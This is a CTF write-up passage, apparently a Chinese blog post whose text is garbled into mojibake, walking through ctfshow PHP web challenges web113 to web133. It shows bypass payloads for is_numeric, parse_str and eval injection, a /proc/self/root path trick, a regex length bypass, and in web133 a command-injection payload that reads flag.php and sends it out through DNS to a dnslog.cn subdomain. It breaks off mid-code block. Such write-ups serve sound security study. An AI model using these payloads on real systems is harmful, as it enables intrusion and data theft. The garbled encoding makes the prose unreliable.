src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220213618137.png" alt="image-20221220213618137"></p><p>è¿™é“é¢˜æŠŠphp://filteråè®®ç»™è¿‡æ»¤æ‰äº†ã€‚é‚£æˆ‘ä»¬å¯ä»¥å°è¯•ä¸‹zlipåè®®</p><p><a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a>   è¿™ç¯‡æ–‡ç« æŠŠå¥½å‡ ç§å¯ä»¥ç”¨åˆ°çš„åè®®éƒ½æ€»ç»“åˆ°ä¸€èµ·äº†</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220214343035.png" alt="image-20221220214343035"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™å°±æ˜¯zlipåè®®çš„ç”¨æ³•ã€‚</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯å®˜æ–¹çš„è§£æ³•</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220214452423.png" alt="image-20221220214452423"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p</span><br><span class="line">roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro</span><br><span class="line">c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/</span><br><span class="line">self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se</span><br><span class="line">lf/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™æ˜¯ç”¨äº†ç›®å½•æº¢å‡ºçš„æ–¹æ³•ï¼Œå¯ä»¥è®°è®°ï¼Œå½“ä½œä¸€ä¸ªç§¯ç´¯</span><br></pre></td></tr></table></figure><h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220214604506.png" alt="image-20221220214604506"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿˜æœ‰ä¸€ç§ä¼ªåè®®æ˜¯glob://flag.php    ä½†æ˜¯è¿™é¢˜ç”¨ä¸äº†ï¼Œå› ä¸ºå°±æ˜¯è¿™ä¸ªè¿”å›çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œhighlight_fileä¸èƒ½é«˜äº®ä¸€ä¸ªæ•°ç»„ï¼Œæ‰€ä»¥å¯ä»¥å½“ä¸ªç§¯ç´¯ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä»”ç»†ç§ç§ï¼Œå‘ç°è¿™é‡Œæ²¡è¿‡æ»¤filter,é‚£ä¹ˆå°±å¯ä»¥ç”¨è€åŠæ³•æ¥è¯•ä¸€ä¸‹äº†ã€‚</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220215659735.png" alt="image-20221220215659735"></p><h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220215805366.png" alt="image-20221220215805366"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220221842229.png" alt="image-20221220221842229"></p><p>è¿™ä¸ªæ˜¯trim()å‡½æ•°ä¼šåˆ æ‰çš„ä¸œè¥¿ï¼Œä¸è¿‡æˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠè¿™ä¸ªå½“ä½œä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œå°±æ˜¯ä»¥åç¢°åˆ°è¿™ç§éœ€è¦åˆ¤æ–­æ•°å­—çš„æ—¶å€™ï¼Œå¯ä»¥åˆ©ç”¨è¿™äº›å­—ç¬¦æ¥ç»•è¿‡ã€‚å½“ç„¶ï¼Œçœ‹åˆ°è¿™é‡Œï¼Œå‘ç°ç¼ºäº†ä¸ª<code>0x0C</code>,åˆšå¥½å¯ä»¥åˆ©ç”¨æ¥ç»•è¿‡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æœ¬åœ°è¯•äº†ä¸€ä¸‹å‘ç°%0c36å¯ä»¥ç»•è¿‡is_numeric</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$num!==&#x27;36&#x27;  è¿™ä¸ªæ˜¯ä¸ªå¼ºç­‰äºï¼Œå› ä¸º%0c36ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥ç»•è¿‡</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trim($num)!==&#x27;36&#x27;  å› ä¸ºtrim()ä¸ä¼šæŠŠ%0cç»™å»æ‰ï¼Œé‚£ä¹ˆä¹Ÿå¯ä»¥è¿›è¡Œç»•è¿‡</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter($num)==&#x27;36&#x27;   è¿™ä¸ªå‡½æ•°é‡Œé¢ä¹Ÿæ²¡æœ‰æŠŠ%0cè¿‡æ»¤çš„ä¸œè¥¿ï¼Œä¹Ÿå¯ä»¥æˆåŠŸè¿”å›36</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æœ‰ç–‘é—®çš„æ˜¯è¿™ä¸ª$num==&#x27;36&#x27;  å’Œ  $num!==&#x27;36&#x27;  è¿™å°±æ¶‰åŠåˆ°äº†ä¸€ä¸ªå¼ºç­‰äºå’Œå¼±ç±»å‹æ¯”è¾ƒçš„é—®é¢˜äº†ï¼Œ==è¡¨ç¤ºçš„æ˜¯å€¼ç›¸ç­‰å°±è¡Œï¼Œ===è¡¨ç¤ºçš„æ˜¯å€¼å’Œç±»å‹éƒ½å¿…é¡»ç›¸ç­‰ã€‚</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220222611713.png" alt="image-20221220222611713"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220222727063.png" alt="image-20221220222727063"></p><h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220222813626.png" alt="image-20221220222813626"></p><p>è¿™é‡Œæœ‰ä¸ªå‘½åçš„è§„åˆ™å°±æ˜¯å—ï¼Œphpä¸­å˜é‡ååªèƒ½ç”±æ•°å­—å­—æ¯å’Œä¸‹åˆ’çº¿ç»„æˆï¼Œå¦‚æœå˜é‡åä¸æ˜¯è¿™æ ·çš„è¯ï¼Œå°±ä¼šè¢«å¼ºåˆ¶è½¬åŒ–ï¼Œä½†phpåªä¼šè½¬æ¢ä¸€æ¬¡ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‰¹ç‚¹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœå˜é‡åä¸­æœ‰ ç©ºæ ¼ + [  åˆ™ä¼šè¢«è½¬åŒ–æˆ  _</span><br></pre></td></tr></table></figure><p><strong>implode</strong>    â€”-&gt;å°±æ˜¯å°†æ•°ç»„ä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¿›è¡Œè¾“å‡º</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221215115138.png" alt="image-20221221215115138"></p><p><strong>get_defined_vars</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221215244737.png" alt="image-20221221215244737"></p><p>è¿™é“é¢˜å¯ä»¥ä½¿ç”¨è¿™ä¸¤ä¸ªä¸œè¥¿æ¥è§£ã€‚</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221215529027.png" alt="image-20221221215529027"></p><p>è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°<code>echo</code>å¯ä»¥ç”¨  é‚£ä¹ˆå¯ä»¥å°è¯•ç›´æ¥<code>echo $flag</code>.</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221215640332.png" alt="image-20221221215640332"></p><p>æ‹¿åˆ°flagï¼Œæˆ–è€…ä¹Ÿå¯ä»¥ä¸Šé¢çš„ä¸¤ç§å‡½æ•°çš„ç»“åˆæ–¹æ³•ã€‚</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221215751225.png" alt="image-20221221215751225"></p><p>ä¹Ÿå¯ä»¥ç›´æ¥æ‹¿åˆ°flag.</p><h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221215903203.png" alt="image-20221221215903203"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™æ¬¡è¦ä½¿ç”¨POSTçš„æ–¹æ³•æäº¤æ•°æ®ï¼Œextract($_POST)ä¼šå°†POSTçš„æ•°æ®ä¸­çš„é”®åå’Œé”®å€¼è½¬æ¢ä¸ºç›¸åº”çš„å˜é‡åå’Œå˜é‡å€¼</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract($_GET)  å’Œpostä¸€æ ·</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆä¼ fl0gå°±å¯ä»¥ç›´æ¥ç”¨<strong>post</strong>ä¼ äº†</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221222623391.png" alt="image-20221221222623391"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_export()è¿˜æ˜¯å¯ä»¥æ›¿ä»£var_dumpæ¥ç”¨</span><br></pre></td></tr></table></figure><p><strong>è§£æ³•äºŒ</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221222913484.png" alt="image-20221221222913484"></p><p>show_source();   ä¸€æ ·çš„æ•ˆæœ</p><h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221223023719.png" alt="image-20221221223023719"></p><p>è¿™é¢˜å¼€å§‹åˆ¤æ–­é•¿åº¦äº†</p><p><strong>parse_str</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222164714051.png" alt="image-20221222164714051"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222164510131.png" alt="image-20221222164510131"></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥çŸ¥é“parse_stræ˜¯å¹²ä»€ä¹ˆçš„äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å°±æ˜¯å°†ä¸€ä¸²å­—ç¬¦ä¸²æ¥è§£ææˆæ•°ç»„çš„å½¢å¼å¹¶å­˜å‚¨åœ¨è®¾å®šçš„æ•°ç»„é‡Œï¼Œè€Œ+ä¼šèµ·åˆ°åˆ†å‰²ä½œç”¨ï¼Œå¦‚æœä¸åˆ†å‰²çš„è¯ï¼Œå¯èƒ½ä¼šåƒä¸Šå›¾ä¸€æ ·å˜æˆåªæœ‰ä¸€ä¸ªä¸‹æ ‡ä¸º0çš„ä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœæœ‰åŠ å·åˆ†å‰²çš„è¯ï¼Œå°±ä¼šå˜æˆæœ‰ä¸‹æ ‡åˆ†åˆ«ä¸º0å’Œ1çš„æ•°ç»„ï¼Œé‚£ä¹ˆç°åœ¨å°±å·²ç»æŠŠè¿™ä¸ªå‡½æ•°çš„è¿ç”¨å…¨éƒ¨è®²å®Œäº†ã€‚</span><br></pre></td></tr></table></figure><p><strong>å›åˆ°é¢˜ç›®</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER æ˜¯ä¸€ä¸ªåŒ…å«äº†è¯¸å¦‚å¤´ä¿¡æ¯(header)ã€è·¯å¾„(path)ã€ä»¥åŠè„šæœ¬ä½ç½®(script locations)ç­‰ç­‰ä¿¡æ¯çš„æ•°ç»„ã€‚</span><br><span class="line">ä¸åŒçš„å‚æ•°ä¿å­˜ä¸åŒçš„ä¿¡æ¯ï¼Œæ¯”å¦‚ï¼Œ</span><br><span class="line">$_SERVER[&#x27;argv&#x27;] //ä¼ é€’ç»™è¯¥è„šæœ¬çš„å‚æ•°ã€‚</span><br><span class="line">$_SERVER[&#x27;argc&#x27;] //ä¼ é€’ç»™ç¨‹åºçš„å‘½ä»¤è¡Œå‚æ•°çš„ä¸ªæ•°ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=$_SERVER[&#x27;argv&#x27;];   æ˜¯ä¸ªç©ºæ•°ç»„</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨parse_strå¾€æ•°ç»„é‡Œé¢ä¼ å€¼ã€‚</p><p><strong>è§£æ³•ä¸€</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET:?a=1+fl0g=flag_give_me</span><br><span class="line">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</span><br><span class="line">//è¿™ä¸‹æ•°ç»„aé‡Œé¢å°±ä¼šæœ‰keyå€¼åˆ†åˆ«ä¸º0å’Œ1çš„å€¼  ä¸‹æ ‡ä¸º0å¯¹åº”ç€a=1ï¼Œä¸‹æ ‡ä¸º1å¯¹åº”è¿™fl0g=flag_give_me é‚£ä¹ˆå°±å¯ä»¥è§£å†³é—®é¢˜äº†ã€‚(è¿™æ˜¯æ²¡æœ‰parse_strçš„æ—¶å€™ï¼Œparse_strçš„è¯ï¼Œkeyå°±åˆ†åˆ«å˜ä¸ºaå’Œfl0g)</span><br></pre></td></tr></table></figure><p><strong>è§£æ³•äºŒ</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">url/?$fl0g=flag_give_me;</span><br><span class="line">CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=eval($a[0])</span><br><span class="line"></span><br><span class="line">$c=&quot;eval($a[0])&quot;</span><br><span class="line">$a[0]=&quot;$fl0g=flag_give_me;&quot;</span><br><span class="line">$c=&quot;eval($fl0g=flag_give_me;)&quot;</span><br><span class="line">eval($c;)</span><br><span class="line">eval(eval($fl0g=flag_give_me;);)</span><br><span class="line">// æŠŠevalæ¢æˆassertä¹Ÿè¡Œ   assert(xxx)  å¦‚æœxxxæ˜¯å­—ç¬¦ä¸²çš„è¯ï¼Œä¼šæŠŠå®ƒå½“ä½œphpä»£ç æ¥æ‰§è¡Œ  å’Œä¸Šé¢çš„ä¸€æ ·</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assertå’Œevalä¸parse_strä¸åŒçš„æ˜¯ï¼Œevalè¦åŠ ä¸Š$ç¬¦å·</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222171040081.png" alt="image-20221222171040081"></p><p>å¾€æ•°ç»„aä¼ å€¼çš„è¯ï¼Œéƒ½ä¼šå…ˆä¼ åˆ°ä¸‹æ ‡0ä¸‹é¢</p><p><strong>éé¢„æœŸè§£</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get: ?0=var_export($GLOBALS);</span><br><span class="line">post: CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($_REQUEST[0])</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222171455203.png" alt="image-20221222171455203"></p><p>è¿™æ ·å†™ä¹Ÿè¡Œï¼Œä¸parse_strä¸åŒçš„æ˜¯æœ‰æ— $.</p><h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222171621023.png" alt="image-20221222171621023"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222172706658.png" alt="image-20221222172706658"></p><p><a href="https://www.cnblogs.com/luomir/p/5129875.html">https://www.cnblogs.com/luomir/p/5129875.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é€šè¿‡è¿™ä¸ªå›¾ç‰‡å’Œè¿™ä¸ªåšå®¢ï¼ŒçŸ¥é“äº†$url = $_SERVER[&#x27;QUERY_STRING&#x27;];çš„ä½œç”¨</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå°±å¯ä»¥è¿›è¡Œåˆ¤æ–­äº†ï¼Œé‚£ä¹ˆå°±æ˜¯å¾—$urlä¼šç­‰äºé—®å·åé¢çš„å†…å®¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è®©$url=ctf<em>show=ilove36dï¼Œç„¶åå°±å¯ä»¥å¾—åˆ°flagï¼Œä½†æ˜¯</em>è¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡éæ³•å‘½åæ¥è·å¾—__,</p><p>é‚£ä¹ˆ[ + .è¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ç©ºæ ¼æ¥ä»£æ›¿ï¼Œé‚£ä¹ˆå°±å¯ä»¥æˆåŠŸè¾“å‡ºflag.</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222173109121.png" alt="image-20221222173109121"></p><h2 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222173902226.png" alt="image-20221222173902226"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">å°çŸ¥è¯†ç‚¹ï¼š _()æ˜¯ä¸€ä¸ªå‡½æ•°</span><br><span class="line"></span><br><span class="line">_()==gettext() æ˜¯gettext()çš„æ‹“å±•å‡½æ•°ï¼Œå¼€å¯textæ‰©å±•ã€‚éœ€è¦phpæ‰©å±•ç›®å½•ä¸‹æœ‰php_gettext.dll</span><br><span class="line"></span><br><span class="line">get_defined_vars()å‡½æ•°</span><br><span class="line"></span><br><span class="line">get_defined_vars â€” è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ è¿™æ ·å¯ä»¥è·å¾— $flag</span><br></pre></td></tr></table></figure><p>æœ¬åœ°æµ‹è¯•è¿‡äº†ï¼Œ<code>call_user_func</code>ï¼ˆï¼‰é‡Œé¢æœ‰ä¸æ˜¯å‡½æ•°çš„ä¸œè¥¿ï¼Œä¹Ÿå¯ä»¥var_dump()è¾“å‡ºã€‚é‚£ä¹ˆå°±åªéœ€è¦ç®¡æœ€é‡Œé¢çš„ä¸€å±‚<code>`call_user_func</code>ï¼ˆ)`äº†</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222185459392.png" alt="image-20221222185459392"></p><h2 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222190711929.png" alt=""></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222190719988.png" alt="image-20221222190719988"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é»˜è®¤ç›®å½•/var/www/html  å°±æ˜¯å…ˆè¿”å›ä¸Šä¸€å±‚ç›®å½•ï¼ˆhtml)ï¼Œç„¶åè®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„ç›®å½•ï¼Œç„¶åæ¥ç€è®¿é—®ä¸Šå±‚ç›®å½•(www)ï¼Œç„¶åå°±è®¿é—®wwwç›®å½•ä¸‹çš„html,ç„¶ååœ¨è®¿é—®htmlç›®å½•ä¸‹çš„flag.phpå°±å¯ä»¥æ‹¿åˆ°flagäº†ã€‚</span><br></pre></td></tr></table></figure><h2 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222191026405.png" alt="image-20221222191026405"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222192132660.png" alt="image-20221222192132660"></p><p>ç›´æ¥è¾“å…¥å°±æ‹¿åˆ°flagäº†ã€‚</p><p><a href="https://bbs.csdn.net/topics/320227966">https://bbs.csdn.net/topics/320227966</a>    å…³äºæ­£åˆ™çš„è¿™ç¯‡æ–‡ç« å…¨éƒ¨æ¦‚æ‹¬äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.   æ˜¯åŒ¹é…ä»»æ„å­—ç¬¦</span><br><span class="line">+   æ˜¯åŒ¹é…å‡ºç°çš„æ¬¡æ•°</span><br><span class="line">?   æ˜¯ä»»æ„å­—ç¬¦</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸€ä¸ªifçš„æ„æ€æ˜¯ctfshowçš„å‰é¢å¦‚æœæœ‰å­—ç¬¦çš„è¯ï¼Œå°±ä¼šè¢«åŒ¹é…åˆ°</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬äºŒä¸ªifçš„æ„æ€æ˜¯å› ä¸ºstriposè¿”å›çš„æ˜¯è¿™ä¸ªå­—ç¬¦ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œè¿”å›çš„æ˜¯intå‹ï¼Œè€ŒFALSEæ˜¯boolå‹ï¼Œè¿™é‡Œåˆæ˜¯å¼ºç­‰äºï¼Œè‚¯å®šä¸ç›¸ç­‰ã€‚</span><br></pre></td></tr></table></figure><h2 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222193417083.png" alt="image-20221222193417083"></p><p>è¿™é‡Œæœ‰ä¸ªå°æ¼æ´ï¼Œå°±æ˜¯æ­£åˆ™åŒ¹é…çš„è¯ï¼Œå­—ç¬¦é•¿åº¦è¶…è¿‡100wçš„è¯å°±ä¸ä¼šåœ¨ç»§ç»­åŒ¹é…äº†ã€‚</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222193744465.png" alt="image-20221222193744465"></p><p>è¿›è¡Œ100wæ¬¡æ‰“å°ï¼Œç„¶ååŠ ä¸Š36Dctfshow</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222193825464.png" alt="image-20221222193825464"></p><h2 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222194056040.png" alt="image-20221222194056040"></p><p>æ˜¯ä¸€ä¸ªå°ç½‘ç«™</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222194137043.png" alt="image-20221222194137043"></p><p>è®¿é—®robots.txtå¾—åˆ°å¯ä»¥è®¿é—®/adminçš„ä¿¡æ¯</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222194619883.png" alt="image-20221222194619883"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œå°±æ˜¯è€ƒå¯Ÿä¼˜å…ˆçº§å…³ç³»ï¼Œä¾æ¬¡ä»é«˜åˆ°ä½  éä¸æˆ– ï¼&amp; |</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç„¶åç¬¬äºŒä¸ªå°±æ˜¯å…ˆè¿›è¡Œä¸åˆ¤æ–­ä¸ºfalse,ç„¶åfalseä¸$usernameè¿›è¡Œæˆ–è¿ç®—çš„åˆ°trueï¼Œç„¶ååœ¨ä»¤codeç­‰äºadminï¼Œå°±å¯ä»¥æ‹¿åˆ°flagäº†ã€‚</span><br></pre></td></tr></table></figure><h2 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222195142976.png" alt="image-20221222195142976"></p><p>è¿™é“é¢˜å­¦ä¹ çš„ç‚¹è¿˜æ˜¯å¾ˆå¤šçš„ã€‚</p><p><strong>è§£æ³•ä¸€</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222224838401.png" alt="image-20221222224838401"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é€šè¿‡ä¼ å…¥?F=&#x27;$F &#x27;;touch 1,ä¼ å…¥ä¹‹åè®¿é—®1ï¼Œæ²¡æœ‰è¿”å›ï¼Œæ‰€ä»¥å½“å‰ç›®å½•ä¸å¯å†™</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222224847076.png" alt="image-20221222224847076"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?F=`$F`;+ping `cat flag.php | grep ctfshow | tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.wxtcke.dnslog.cn -c 1   </span><br><span class="line">//.wxtcke.dnslog.cn   æ˜¯è‡ªå·±å»danslogä¸Šè·å–çš„äºŒçº§åŸŸå</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">``è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯æ‰§è¡Œphpä»£ç ï¼Œ``æ˜¯shell_exec()å‡½æ•°çš„ç¼©å†™ï¼Œç„¶åå°±å»å‘½ä»¤æ‰§è¡Œã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œçš„æ„æ€æ˜¯ä¼šæˆªå–`$F`;+è¿™å…­ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯$Fçš„å€¼å¹¶æ²¡æœ‰å˜ï¼Œé‚£ä¹ˆå°±ä¼šæˆªå–åˆ°eval(`$F`;+)é‡Œé¢ï¼Œå˜æˆeval(``$F`;+ping `cat flag.php | grep ctfshow | tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.wxtcke.dnslog.cn -c 1`;+)   ç”±äºå‰é¢çš„`$F`;+ï¼Œæ— æ³•è¯†åˆ«ï¼Œå°±ä¼šç»•è¿‡ï¼Œå»æ‰§è¡Œåé¢å¯ä»¥æ‰§è¡Œçš„ä»£ç ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 